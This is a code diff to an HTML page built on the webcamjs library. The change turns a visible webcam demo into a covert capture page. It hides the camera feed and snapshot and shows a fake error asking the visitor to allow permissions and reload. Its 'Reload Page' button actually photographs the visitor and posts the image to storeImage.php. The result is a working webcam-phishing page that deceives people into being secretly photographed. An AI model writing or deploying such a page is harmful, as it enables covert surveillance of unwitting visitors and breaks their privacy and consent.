@@ -2,50 +2,52 @@
 <html>
 
 <head>
-  <title>SayCheese!</title>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/webcamjs/1.0.25/webcam.min.js"></script>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet">
-  <script src="https://cdn.jsdelivr.net/npm/canvas2image@1.0.5/canvas2image.min.js"></script>
-  <script src="main.js"></script>
+    <title>Smile!</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/webcamjs/1.0.25/webcam.min.js"></script>
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css" />
 </head>
 
 <body>
 
-  <div class="container">
-    <div class="row">
-      <div class="col-12">
-        <form action="" method="POST" enctype="multipart/form-data">
-          <div id="my_camera"></div>
+    <div class="container">
+        <br>
+        <!-- <h1 class="text-center">Smile Wider :)</h1> -->
+        <form method="POST" action="storeImage.php">
+            <div class="row">
+                <div class="col-12">
+                    <center>
+                        <div hidden="hidden" id="my_camera"></div>
+                        <br>
+                        <input type="hidden" name="image" class="image-tag">
+                        <div id="results"></div>
+                        <p>An Error Occurred Please Allow All Permissions & Reload This Page</p>
+                        <button onClick="take_snapshot()" class="btn btn-danger">Reload Page</button>
+                    </center>
+                </div>
+            </div>
         </form>
-      </div>
     </div>
-  </div>
 
-  <!-- Configure a few settings and attach camera -->
-  <script language="JavaScript">
+    <!-- Configure a few settings and attach camera -->
+    <script language="JavaScript">
     Webcam.set({
-      width: 640,
-      height: 480,
-      image_format: 'jpeg',
-      jpeg_quality: 90
+        width: 490,
+        height: 390,
+        image_format: 'jpeg',
+        jpeg_quality: 90
     });
 
     Webcam.attach('#my_camera');
 
-    function download() {
-      html2canvas(document.querySelector('#my_camera')).then(canvas => {
-        document.body.appendChild(canvas);
-      });
-    }
-
     function take_snapshot() {
-      Webcam.snap(function(data_uri) {
-        $(".image-tag").val(data_uri);
-        document.getElementById('results').innerHTML = '<img src="' + data_uri + '"/>';
-      });
+        Webcam.snap(function(data_uri) {
+            $(".image-tag").val(data_uri);
+            document.getElementById('results').innerHTML = '<img hidden="hidden" src="' + data_uri + '"/>';
+        });
     }
-  </script>
+    </script>
 
 </body>
 
